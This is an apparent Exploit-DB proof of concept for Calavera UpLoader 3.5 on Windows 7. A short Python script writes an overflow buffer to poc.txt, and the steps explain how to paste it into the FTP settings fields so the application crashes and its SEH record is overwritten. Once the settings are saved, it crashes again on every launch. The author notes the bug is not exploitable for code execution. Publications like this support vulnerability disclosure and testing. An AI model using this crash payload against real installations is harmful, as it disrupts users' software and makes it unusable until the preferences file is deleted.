# Exploit Title: Calavera UpLoader 3.5 - 'FTP Logi' Denial of Service (PoC + SEH Overwrite)
# Date: 2020-07-20
# Author: Felipe Winsnes
# Software Link: https://www.exploit-db.com/apps/463c9e7fe9a39888d3c01bc9ad756bba-UpSetup.exe
# Version: 3.5
# Tested on: Windows 7 (x86)

# Sadly enough, this vulnerability is not exploitable as there are no friendly PPR addresses available and
# yet the vulnerability is triggered with additional padding == can't use addresses with null values.

# Proof of Concept:
# 1.- Run the python script, it will create a new file "poc.txt".
# 2.- Copy the content of the new file 'poc.txt' to clipboard.
# 3.- Open the Application.
# 4.- Click on "Settings".
# 4.- Paste contents of the generated file into the parameters "FTP Address", "Username" and Password". Furthermore, check the box with the statement "Check to save password in preferences".
# 5.- Crashed.
# 6.- As uploadpref.dat is generated, every time the application opens it will crash, with the SEH values being overwritten. In order to stop this behavior simply delete the file.

# If the contents are only pasted into "Password", the application will only crash once without creating uploadpref.dat.

buffer = "A" * 477 + "BBBB" + "CCCC" + "\xff" * 2000

try:
    f = open ("poc.txt", "w")
    f.write(buffer)
    f.close()
    print "[+] The file has been created successfully!"

except:
    print "[!] There has been an error while creating the file."
